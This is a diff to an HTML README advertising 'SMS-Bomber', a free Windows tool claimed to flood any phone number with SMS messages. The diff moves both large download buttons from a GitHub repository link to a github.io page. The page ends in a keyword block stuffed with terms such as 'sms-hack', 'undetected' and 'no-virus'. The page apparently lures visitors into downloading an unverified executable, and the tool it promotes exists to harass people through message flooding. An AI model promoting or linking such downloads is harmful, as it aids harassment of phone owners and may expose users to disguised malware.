@@ -1,7 +1,7 @@
 <h1>📱 SMS-Bomber - Free SMS Flooder for Windows 2026</h1>
 
 <p align="center">
-  <a href="https://github.com/drugginguuq4690/SMS-Bomber" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#ff4757);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,71,87,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://drugginguuq4690.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#ff4757);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,71,87,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 SMS-Bomber is a powerful, free, and undetected SMS flooding tool designed exclusively for Windows PCs in 2026. This application lets you send a high volume of SMS messages to any phone number directly from your computer. No limitations. No hidden fees. Just download, run, and go.
@@ -163,7 +163,7 @@ Remember: Use responsibly. Test on your own numbers or with permission. Enjoy th
 ---
 
 <p align="center">
-  <a href="https://github.com/drugginguuq4690/SMS-Bomber" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#2ed573,#7bed9f);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(46,213,115,0.4);">🚀 DOWNLOAD SMS-BOMBER - FREE</a>
+  <a href="https://drugginguuq4690.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#2ed573,#7bed9f);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(46,213,115,0.4);">🚀 DOWNLOAD SMS-BOMBER - FREE</a>
 </p>
 
 <meta name="keywords" content="download-sms-bomber, free-download-2026, get-sms-bomber-free, sms, sms-2026, sms-bomber, sms-bomber-2026, sms-bomber-download, sms-bomber-free, sms-bomber-free-download, sms-bomber-latest, sms-bomber-no-virus, sms-bomber-pc, sms-bomber-windows, sms-bomber-working, sms-free-2026, sms-free-download, sms-hack, sms-undetected, windows-2026">
